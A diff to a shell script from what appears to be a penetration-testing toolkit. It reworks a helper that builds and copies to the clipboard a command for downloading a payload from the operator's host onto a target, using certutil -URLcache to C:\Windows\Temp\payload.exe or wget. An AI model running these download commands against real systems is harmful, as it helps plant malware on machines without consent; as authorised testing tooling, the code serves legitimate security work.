@@ -13,7 +13,7 @@ The srv namespace provides commands for hosting local services such as web, ftp,
 Commands
 --------
 nb-srv-install          install dependencies
-nb-srv-file-download    download a payload to a target machine
+nb-srv-file-download    copy command to download a payload into a target machine
 nb-srv-web              hosts a python web server in current dir
 nb-srv-ftp              hosts a python ftp server in current dir
 nb-srv-smb              hosts an impacket smb server in current dir
@@ -41,27 +41,28 @@ nb-srv-file-download() {
     nb-vars-set-lhost
     nb-vars-set-lport
 
-    echo
-    echo -n "Whats the server port: "
-    read port
-
-    echo
-    echo -n "Whats the filename to download: "
+    echo -n "Filename: "
     read filename
+    echo
+
+    clear
 
     __ask "Choose a command to copy:"
-    echo "1.  certutil -URLcache -split -f http://<LHOST>:<PORT>/<FILENAME> C:\Windows\Temp\payload.exe"
-    echo "2.  wget http://<LHOST>:<PORT>/<FILENAME>"
-    echo "3. Previous menu"
+    echo "1.  certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\payload.exe"
+    echo "2.  wget http://<LHOST>:<PORT>/$filename"
+    echo "3.  Previous menu"
     echo
+    echo -n "Choice: "
     read choice
 
     case $choice in
-        1) __COMMAND=certutil -URLcache -split -f http://${__LHOST}:$port/$filename C:\Windows\Temp\payload.exe;;
-        2) __COMMAND=wget http://${__LHOST}/$filename
+        1) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\payload.exe";;
+        2) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename";;
         3) exit;;
         *) echo "Invalid option";;
     esac
+
+    echo "$__COMMAND" | wl-copy
 }
 
 nb-srv-web() {
